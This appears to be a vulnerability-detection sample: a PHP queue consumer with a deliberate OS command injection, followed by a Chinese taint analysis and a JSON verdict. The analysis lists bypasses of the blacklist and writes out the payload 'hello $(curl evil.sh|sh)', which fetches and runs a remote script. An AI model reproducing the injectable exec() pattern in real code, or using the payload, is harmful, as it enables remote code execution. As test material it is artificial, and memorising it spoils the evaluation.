@@ -1,0 +1,55 @@
+LANG: php
+```php
+<?php
+// modules/logfmt/LogFormatterConsumer.php
+// 被上层消息服务调用：消费 'log.format' 队列消息，处理外部提交的富文本/日志内容
+
+namespace App\Modules\LogFmt;
+
+use PhpAmqpLib\Message\AMQPMessage;
+
+class LogFormatterConsumer
+{
+    private array $banned = [';', '|', '`'];
+
+    public function onMessage(AMQPMessage $msg): void
+    {
+        // 消息体为 JSON：{"template": "...", "fields": {"user": "...", "action": "..."}}
+        $payload = json_decode($msg->getBody(), true);
+        if (!is_array($payload) || !isset($payload['template'])) {
+            return;
+        }
+
+        $template = (string)$payload['template'];
+        $fields   = isset($payload['fields']) && is_array($payload['fields'])
+            ? $payload['fields'] : [];
+
+        // 弱防御：仅做黑名单字符剔除，可被编码/空白变体绕过
+        foreach ($this->banned as $ch) {
+            $template = str_replace($ch, '', $template);
+        }
+
+        // 将字段值按占位符替换进模板
+        foreach ($fields as $key => $value) {
+            $template = str_replace('{{' . $key . '}}', (string)$value, $template);
+        }
+
+        // 渲染后的日志写入归档前先经外部格式化工具转换
+        $cmd = '/usr/local/bin/logfmt-convert --format rich --text "' . $template . '"';
+        exec($cmd, $out, $code);
+
+        file_put_contents('/var/log/app/formatted.log', implode("
+", $out) . PHP_EOL, FILE_APPEND);
+    }
+}
+```
+
+1. 第 12 行 `onMessage(AMQPMessage $msg)` 是污点边界：本文件没有任何 request/input/environ 等显式 web 入口，但该回调由消息队列消费方触发，`$msg` 的消息体承载外部提交的富文本/日志内容（公开接口提交的内容必须按不可信处理），是等效污点源。
+2. 第 15 行 `$msg->getBody()` 取出原始消息体，第 16 行 json_decode 后 `$payload['template']` 与 `$payload['fields']` 均完全外部可控；第 20 行起 `$template`、第 26 行字段值持续携带污点。
+3. 第 23–25 行的黑名单 str_replace 仅删除 `;`、`|`、反引号三个字符，属可绕过弱防御：攻击者可用 `$(id)` 命令替换（无需分号）、换行符 `%0a`、或利用双引号内 `$(...)` 直接执行子命令绕过；且未过滤 `$()`、`&&`、`||`、重定向等元字符。第 26 行对 fields 值完全没有过滤。
+4. 第 30 行将污点模板直接拼入 shell 命令字符串，第 31 行 `exec($cmd)` 是 CWE-78 危险 sink：source→sink 全程无有效净化，攻击者提交 template 为 `hello $(curl evil.sh|sh)` 即可在服务器执行任意命令。
+5. 第二入口检查：本文件无其他路由/HTTP 参数入口，也无其他函数读取外部数据；唯一替代通道是该回调本身——fields 数组值同样流入同一 sink（第 26→30→31 行），构成第二条可达数据流，进一步确认漏洞成立。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 12: 回调参数 AMQPMessage $msg 的消息体（line 15 getBody 解析出的 template 与 fields）", "sink": "line 31: exec($cmd)", "explanation": "消息体 payload.template 经 line 23-25 黑名单 str_replace 弱过滤后于 line 30 拼入命令串并在 line 31 执行，黑名单可被 $(...) 命令替换、换行符等绕过; fields 字段值在 line 26 替换时完全未过滤，同样流向 line 30-31 的 sink; 本文件无 HTTP 路由等第二入口，唯一替代通道即该回调自身的第二条 source->sink 流，两条流均无有效防御", "fix_suggestion": "line 30: 使用 escapeshellarg($template) 包裹参数并避免拼接，或改用 proc_open 的数组参数形式传递文本"}
+```
